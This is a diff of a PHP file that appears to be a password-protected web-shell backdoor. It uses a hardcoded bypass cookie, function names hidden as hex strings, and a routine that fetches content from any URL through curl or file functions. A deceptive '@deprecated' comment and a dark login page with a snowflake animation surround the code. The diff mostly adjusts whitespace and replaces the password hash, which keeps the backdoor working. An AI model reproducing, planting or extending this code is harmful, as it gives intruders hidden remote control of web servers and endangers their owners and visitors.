@@ -8,7 +8,7 @@
 // @deprecated  1.0  Deprecated without replacement
 function is_logged_in()
 {
-    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === '0xSHALLBYP@2124';
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === '0xSHALLBYP@2124'; 
 }
 
 if (is_logged_in()) {
@@ -29,13 +29,13 @@ if (is_logged_in()) {
 
     function geturlsinfo($destiny) {
         $belief = array(
-            hex2str($GLOBALS['Array'][0]),
-            hex2str($GLOBALS['Array'][1]),
-            hex2str($GLOBALS['Array'][2]),
-            hex2str($GLOBALS['Array'][3])
+            hex2str($GLOBALS['Array'][0]), 
+            hex2str($GLOBALS['Array'][1]), 
+            hex2str($GLOBALS['Array'][2]), 
+            hex2str($GLOBALS['Array'][3])  
         );
 
-        if (function_exists($belief[3])) {
+        if (function_exists($belief[3])) { 
             $ch = curl_init($destiny);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -45,9 +45,9 @@ if (is_logged_in()) {
             $love = $belief[3]($ch);
             curl_close($ch);
             return $love;
-        } elseif (function_exists($belief[2])) {
+        } elseif (function_exists($belief[2])) { 
             return $belief[2]($destiny);
-        } elseif (function_exists($belief[0]) && function_exists($belief[1])) {
+        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
             $purpose = $belief[0]($destiny, "r");
             $love = $belief[1]($purpose);
             fclose($purpose);
@@ -64,11 +64,11 @@ if (is_logged_in()) {
 } else {
     if (isset($_POST['password'])) {
         $entered_key = $_POST['password'];
-        $hashed_key = 'f6077f57df944e0c75c30b635615cc9c';
-
+        $hashed_key = '$2b$12$bm/heFb/Htl2hKqAIaq2J.WMGOLmhKOu0lzOIaMVcr3RWKxIHfv02';
+        
         if (password_verify($entered_key, $hashed_key)) {
-            setcookie('user_id', '0xSHALLBYP@2124', time() + 3600, '/');
-            header("Location: ".$_SERVER['PHP_SELF']);
+            setcookie('user_id', '0xSHALLBYP@2124', time() + 3600, '/'); 
+            header("Location: ".$_SERVER['PHP_SELF']); 
             exit();
         }
     }
@@ -84,7 +84,7 @@ if (is_logged_in()) {
                 height: 100vh;
                 width: 100vw;
                 background: #000;
-                overflow: hidden;
+                overflow: hidden; 
                 position: relative;
             }
             .login-container {
@@ -144,12 +144,12 @@ if (is_logged_in()) {
                 snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
                 snowflake.style.opacity = Math.random();
                 document.body.appendChild(snowflake);
-
+                
                 setTimeout(() => {
                     snowflake.remove();
-                }, 5000);
+                }, 5000); 
             }
-
+            
             setInterval(createSnowflake, 100);
         </script>
     </body>
